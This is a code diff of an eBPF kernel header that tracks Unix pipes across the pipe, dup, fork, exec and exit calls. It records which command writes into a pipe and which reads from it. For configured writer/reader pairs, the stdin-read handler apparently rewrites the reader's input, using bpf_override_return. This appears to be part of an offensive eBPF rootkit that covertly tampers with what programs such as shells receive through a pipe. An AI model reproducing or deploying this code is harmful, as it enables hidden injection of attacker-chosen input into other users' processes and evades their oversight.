@@ -8,7 +8,57 @@
 #ifndef _PIPE_H_
 #define _PIPE_H_
 
-struct bpf_map_def SEC("maps/pid_pipe_token") pid_pipe_token = {
+struct pipe_ctx_t {
+    void *fds;
+};
+
+struct bpf_map_def SEC("maps/pipe_ctx") pipe_ctx = {
+    .type = BPF_MAP_TYPE_LRU_HASH,
+    .key_size = sizeof(u32),
+    .value_size = sizeof(void *),
+    .max_entries = 1024,
+    .pinning = 0,
+    .namespace = "",
+};
+
+SYSCALL_KPROBE1(pipe, void *, fds) {
+    u32 tgid = bpf_get_current_pid_tgid() >> 32;
+    struct pipe_ctx_t pctx = {};
+    pctx.fds = fds;
+    bpf_map_update_elem(&pipe_ctx, &tgid, &pctx, BPF_ANY);
+    return 0;
+}
+
+SYSCALL_KPROBE1(pipe2, void *, fds) {
+    u32 tgid = bpf_get_current_pid_tgid() >> 32;
+    struct pipe_ctx_t pctx = {};
+    pctx.fds = fds;
+    bpf_map_update_elem(&pipe_ctx, &tgid, &pctx, BPF_ANY);
+    return 0;
+}
+
+struct tokens_t {
+    u32 token1;
+    u32 token2;
+};
+
+__attribute__((always_inline)) u32 select_active_token(struct tokens_t *tokens) {
+    if (tokens->token2 == 0) {
+        return tokens->token1;
+    }
+    return tokens->token2;
+}
+
+struct bpf_map_def SEC("maps/pid_pipe_tokens") pid_pipe_tokens = {
+    .type = BPF_MAP_TYPE_LRU_HASH,
+    .key_size = sizeof(u32),
+    .value_size = sizeof(struct tokens_t),
+    .max_entries = 1024,
+    .pinning = 0,
+    .namespace = "",
+};
+
+struct bpf_map_def SEC("maps/pipelines") pipelines = {
     .type = BPF_MAP_TYPE_LRU_HASH,
     .key_size = sizeof(u32),
     .value_size = sizeof(u32),
@@ -17,19 +67,51 @@ struct bpf_map_def SEC("maps/pid_pipe_token") pid_pipe_token = {
     .namespace = "",
 };
 
-__attribute__((always_inline)) int handle_pipe() {
+__attribute__((always_inline)) int handle_pipe(int fds[2]) {
+    int fd1, fd2 = 0;
+    struct tokens_t new_tokens = {};
+
+    bpf_probe_read(&fd1, sizeof(fd1), &fds[0]);
+    bpf_probe_read(&fd2, sizeof(fd2), &fds[1]);
+
     u32 tgid = bpf_get_current_pid_tgid() >> 32;
-    u32 pipe_token = bpf_get_prandom_u32();
-    bpf_map_update_elem(&pid_pipe_token, &tgid, &pipe_token, BPF_ANY);
+    struct tokens_t *tokens = bpf_map_lookup_elem(&pid_pipe_tokens, &tgid);
+    if (tokens == NULL) {
+        tokens = &new_tokens;
+    }
+
+    if (tokens->token1 == 0) {
+        tokens->token1 = bpf_get_prandom_u32();
+    } else if (tokens->token2 == 0) {
+        tokens->token2 = bpf_get_prandom_u32();
+        bpf_map_update_elem(&pipelines, &tokens->token2, &tokens->token1, BPF_ANY);
+    } else {
+        tokens->token1 = tokens->token2;
+        tokens->token2 = bpf_get_prandom_u32();
+        bpf_map_update_elem(&pipelines, &tokens->token2, &tokens->token1, BPF_ANY);
+    }
+    bpf_map_update_elem(&pid_pipe_tokens, &tgid, tokens, BPF_ANY);
+    // bpf_printk("pipe: pid:%d token1:%lu token2:%lu\n", tgid, tokens->token1, tokens->token2);
+    // bpf_printk("      fd0:%d fd1:%d\n", fd1, fd2);
     return 0;
 }
 
-SYSCALL_KPROBE0(pipe) {
-    return handle_pipe();
+SYSCALL_KRETPROBE(pipe) {
+    u32 tgid = bpf_get_current_pid_tgid() >> 32;
+    struct pipe_ctx_t *pctx = bpf_map_lookup_elem(&pipe_ctx, &tgid);
+    if (pctx == NULL) {
+        return 0;
+    }
+    return handle_pipe(pctx->fds);
 }
 
-SYSCALL_KPROBE0(pipe2) {
-    return handle_pipe();
+SYSCALL_KRETPROBE(pipe2) {
+    u32 tgid = bpf_get_current_pid_tgid() >> 32;
+    struct pipe_ctx_t *pctx = bpf_map_lookup_elem(&pipe_ctx, &tgid);
+    if (pctx == NULL) {
+        return 0;
+    }
+    return handle_pipe(pctx->fds);
 }
 
 struct _tracepoint_sched_process_fork
@@ -52,17 +134,33 @@ int sched_process_fork(struct _tracepoint_sched_process_fork *args) {
     bpf_probe_read(&child_pid, sizeof(child_pid), &args->child_pid);
 
     // copy pipe token from parent to child if there is one
-    u32 *token = bpf_map_lookup_elem(&pid_pipe_token, &ppid);
-    if (token == NULL)
+    struct tokens_t *tokens = bpf_map_lookup_elem(&pid_pipe_tokens, &ppid);
+    if (tokens == NULL)
         return 0;
 
-    bpf_map_update_elem(&pid_pipe_token, &child_pid, token, BPF_ANY);
+    bpf_map_update_elem(&pid_pipe_tokens, &child_pid, tokens, BPF_ANY);
+    // bpf_printk("fork: token1:%lu token2:%lu pid:%d\n", tokens->token1, tokens->token2, child_pid);
     return 0;
 }
+
+struct pipe_writers_t {
+    u32 pid;
+    char comm[16];
+};
+
+struct bpf_map_def SEC("maps/pipe_writers") pipe_writers = {
+    .type = BPF_MAP_TYPE_LRU_HASH,
+    .key_size = sizeof(u32),
+    .value_size = 16,
+    .max_entries = 1024,
+    .pinning = 0,
+    .namespace = "",
+};
 
 struct piped_stdin_t {
     u32 prog_key;
     u32 cursor;
+    u32 pipe_token;
 };
 
 struct bpf_map_def SEC("maps/pid_with_piped_stdin") pid_with_piped_stdin = {
@@ -76,17 +174,55 @@ struct bpf_map_def SEC("maps/pid_with_piped_stdin") pid_with_piped_stdin = {
 
 __attribute__((always_inline)) int handle_dup(int oldfd, int newfd) {
     u32 pid = bpf_get_current_pid_tgid() >> 32;
-    u32 *token = bpf_map_lookup_elem(&pid_pipe_token, &pid);
-    if (token == NULL)
+    struct tokens_t *tokens = bpf_map_lookup_elem(&pid_pipe_tokens, &pid);
+    if (tokens == NULL)
         return 0;
 
-    // we only care about the receiving end of the pipe
-    if (newfd != 0)
+    u32 token = select_active_token(tokens);
+
+    // save the comm of the writer
+    if (newfd == 1) {
+        struct pipe_writers_t val = {};
+        val.pid = pid;
+        bpf_map_update_elem(&pipe_writers, &token, &val, BPF_ANY);
+        // bpf_printk("dup writer: oldfd:%d newfd:%d\n", oldfd, newfd);
+    }
+
+    // save the pipe context for the receiver
+    if (newfd == 0) {
+        // mark stdin as piped for active pid
+        struct piped_stdin_t val = {};
+        val.pipe_token = token;
+        bpf_map_update_elem(&pid_with_piped_stdin, &pid, &val, BPF_ANY);
+        // bpf_printk("dup reader: oldfd:%d newfd:%d\n", oldfd, newfd);
+    }
+
+    return 0;
+}
+
+SEC("kprobe/security_bprm_committed_creds")
+int kprobe_security_bprm_committed_creds(struct pt_regs *ctx) {
+    struct pipe_writers_t updated_entry = {};
+    bpf_get_current_comm(&updated_entry.comm, sizeof(updated_entry.comm));
+    // bpf_printk("exec: %s\n", updated_entry.comm);
+
+    u32 pid = bpf_get_current_pid_tgid() >> 32;
+    struct tokens_t *tokens = bpf_map_lookup_elem(&pid_pipe_tokens, &pid);
+    if (tokens == NULL)
         return 0;
 
-    // mark stdin as piped for active pid
-    struct piped_stdin_t val = {};
-    bpf_map_update_elem(&pid_with_piped_stdin, &pid, &val, BPF_ANY);
+    // bpf_printk("exec: pid:%d token1:%lu token2:%lu\n", pid, tokens->token1, tokens->token2);
+    u32 token = select_active_token(tokens);
+
+    struct pipe_writers_t *val = bpf_map_lookup_elem(&pipe_writers, &token);
+    if (val == NULL)
+        return 0;
+
+    if (val->pid == pid) {
+        updated_entry.pid = val->pid;
+        bpf_map_update_elem(&pipe_writers, &token, &updated_entry, BPF_ANY);
+        // bpf_printk("exec writer token:@%lu comm:%s\n", token, updated_entry.comm);
+    }
     return 0;
 }
 
@@ -105,7 +241,7 @@ int kprobe_do_exit(struct pt_regs *ctx) {
     u32 pid = pid_tgid;
 
     if (tgid == pid) {
-        bpf_map_delete_elem(&pid_pipe_token, &tgid);
+        bpf_map_delete_elem(&pid_pipe_tokens, &tgid);
         bpf_map_delete_elem(&pid_with_piped_stdin, &tgid);
     }
 
@@ -117,7 +253,7 @@ int kprobe_do_exit(struct pt_regs *ctx) {
 
 struct bpf_map_def SEC("maps/comm_prog_key") comm_prog_key = {
     .type = BPF_MAP_TYPE_LRU_HASH,
-    .key_size = 16,
+    .key_size = 32,
     .value_size = sizeof(u32),
     .max_entries = 1024,
     .pinning = 0,
@@ -139,16 +275,45 @@ __attribute__((always_inline)) int handle_stdin_read(struct pt_regs *ctx, void *
     if (piped_stdin == NULL)
         return 0;
 
+    // bpf_printk("stdin read: token:@%lu pid:%d\n", piped_stdin->pipe_token, tgid);
     if (piped_stdin->prog_key == 0) {
-        // check if the receiver of the pipe is one of the program we care about
-        char comm[16];
-        bpf_get_current_comm(&comm, sizeof(comm));
+        // retrieve the comm of the writer
+        struct pipe_writers_t *val = bpf_map_lookup_elem(&pipe_writers, &piped_stdin->pipe_token);
+        if (val == NULL) {
+            u32 *next_token = bpf_map_lookup_elem(&pipelines, &piped_stdin->pipe_token);
+            if (next_token == NULL) {
+                // bpf_printk("stdin read: no pipeline\n");
+                return 0;
+            }
+            val = bpf_map_lookup_elem(&pipe_writers, next_token);
+            if (val == NULL) {
+                // bpf_printk("stdin read: no writer\n");
+                return 0;
+            }
+        }
 
-        u32 *prog_key = bpf_map_lookup_elem(&comm_prog_key, comm);
+        // check if the receiver of the pipe is one of the program we care about
+        char to[16] = {};
+        bpf_get_current_comm(&to, sizeof(to));
+
+        char pipe_key[32] = {};
+        bpf_probe_read(&pipe_key, 16, val->comm);
+        bpf_probe_read(&pipe_key[16], 16, &to);
+        // bpf_printk("read from: %s\n", val->comm);
+        // bpf_printk("read to: %s\n", to);
+
+        u32 *prog_key = bpf_map_lookup_elem(&comm_prog_key, pipe_key);
         if (prog_key == 0) {
-            // we don't care about this program, delete pid_with_piped_stdin entry
-            bpf_map_delete_elem(&pid_with_piped_stdin, &tgid);
-            return 0;
+            // try without the source comm
+            char zero[16] = {};
+            bpf_probe_read(&pipe_key, 16, &zero);
+
+            prog_key = bpf_map_lookup_elem(&comm_prog_key, pipe_key);
+            if (prog_key == 0) {
+                // we don't care about this program, delete pid_with_piped_stdin entry
+                bpf_map_delete_elem(&pid_with_piped_stdin, &tgid);
+                return 0;
+            }
         }
         piped_stdin->prog_key = *prog_key;
     }
@@ -172,7 +337,7 @@ __attribute__((always_inline)) int handle_stdin_read(struct pt_regs *ctx, void *
     piped_stdin->cursor += 1;
     bpf_override_return(ctx, 1);
 
-//    bpf_printk("(+%d) %s\n", piped_stdin->cursor, buf);
+    // bpf_printk("(+%d) %s\n", piped_stdin->cursor, buf);
     return 0;
 }
 
